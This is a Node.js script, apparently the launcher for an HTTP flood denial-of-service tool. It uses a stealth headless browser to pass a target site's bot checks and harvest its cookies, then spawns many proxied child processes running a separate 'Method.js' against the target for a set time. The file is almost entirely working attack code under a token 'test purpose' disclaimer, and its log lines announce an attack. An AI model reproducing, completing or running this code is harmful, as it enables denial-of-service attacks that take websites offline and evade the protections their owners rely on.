// Author: @JuiceW2LD (V4)
// Only For Test Purpose. I Won't Accept Any Responsibility For What You Do With This Script...
// USAGE: node START.js ["URL"] [METHOD(GET-POST)] [THREADS] [TIME] [ProxyFile] [RANDCOOKIE(true - false)] Optional(%RAND%):[RAND_Length] - https://example.com/%RAND% 
// node START.js "https://example.com/%RAND%" GET 600 5 proxies.txt

// npm i os chalk events request puppeteer puppeteer-extra puppeteer-extra-plugin-stealth
// Windows: Download chromedriver like your main chrome version AND Don't Forget To Add chromedriver.exe Into Your Windows PATH
// Linux: sudo apt install -y chromium-browser
var TARGET;
if(process.argv[2] === undefined){
    console.log("Wrong Usage!");
    console.log("Usage: node START.js [URL(%RAND%)] [METHOD(GET-POST)] [THREADS] [TIME] [ProxyFile] [RANDCOOKIE(true - false)] Optional:[RAND_Length]");
    process.exit(3162);
} else {
    TARGET = process.argv[2].replace("\"", "");
    if(TARGET.includes("%RAND%")){
        if(process.argv.length < 8)
        {
            console.log("Wrong Usage!");
            console.log("Usage: node START.js [URL(%RAND%)] [METHOD(GET-POST)] [THREADS] [TIME] [ProxyFile] Optional:[RAND_Length]");
            process.exit(3162);
        }
    }
}
var executablePath;
const os = require('os');
const osPlatform = os.platform();
if (/^win/i.test(osPlatform)) {
    executablePath = '';
}else if (/^linux/i.test(osPlatform)) {
    executablePath = '/usr/bin/chromium-browser';
}
var RANDCOOKIE = process.argv[7];
var LENGTH = process.argv[8];
var COOKIES;
const {spawn} = require('child_process')
const chalk = require("chalk");
const EventEmitter = require('events');
const puppeteer = require('puppeteer-extra')
var BROWSER;
var INDEX_RAND;
if(TARGET.includes("%RAND%")){RAND = 1; BROWSER = TARGET.replace("%RAND%", ""); INDEX_RAND = TARGET.indexOf("%RAND%");}else{BROWSER = TARGET}
var METHOD = process.argv[3];
var THREADS = process.argv[4];
var TIME = process.argv[5];
var PROXIES = process.argv[6];
const emitter = new EventEmitter();
emitter.setMaxListeners(Number.POSITIVE_INFINITY);
process.setMaxListeners(0);
EventEmitter.defaultMaxListeners = Infinity;
EventEmitter.prototype._maxListeners = Infinity;
process.on('uncaughtException', function (err) { });
process.on('unhandledRejection', function (err) { });

async function GetCookies(){
    String.prototype.replaceBetween = function(start, end, what) {
        return this.substring(0, start) + what + this.substring(end);
    };
    console.log(chalk.blue(`Started Attack On ${TARGET} For ${TIME} Second`))

    const StealthPlugin = require('puppeteer-extra-plugin-stealth')
    puppeteer.use(StealthPlugin())
    puppeteer.launch({ headless: true , executablePath: executablePath, args: ['--no-sandbox']}).then(async browser => {
        console.log(chalk.red("Browsing The WebSite...."));
        const page = await browser.newPage()
        await page.goto(BROWSER)
        await page.waitForTimeout(7000)
        //await page.screenshot({ path: 'testresult.png', fullPage: true })
        await page.goto(BROWSER)
        //await page.screenshot({ path: 'testresult2.png', fullPage: true })
        COOKIES = await page.cookies()
        await browser.close()
        //console.log(COOKIES)
        for (i=0, len=COOKIES.length, F_COOKIES=""; i<len; i++){
            F_COOKIES += COOKIES[i]['name'] + ": " + COOKIES[i]['value'] + "; "
        }
        COOKIES = `\"${F_COOKIES}\"`
        console.log(COOKIES)
        for (i=0; i<THREADS; i++){
            console.log(`Thread ${i+1} Started!`)
            if (LENGTH === undefined){
                spawn(process.argv[0], [ "Method.js", TARGET, METHOD, TIME, COOKIES, PROXIES, RANDCOOKIE]);
            }
            else{
                spawn(process.argv[0], [ "Method.js", TARGET, METHOD, TIME, PROXIES, COOKIES, RANDCOOKIE, LENGTH]);
            }
        }
    });
}

GetCookies();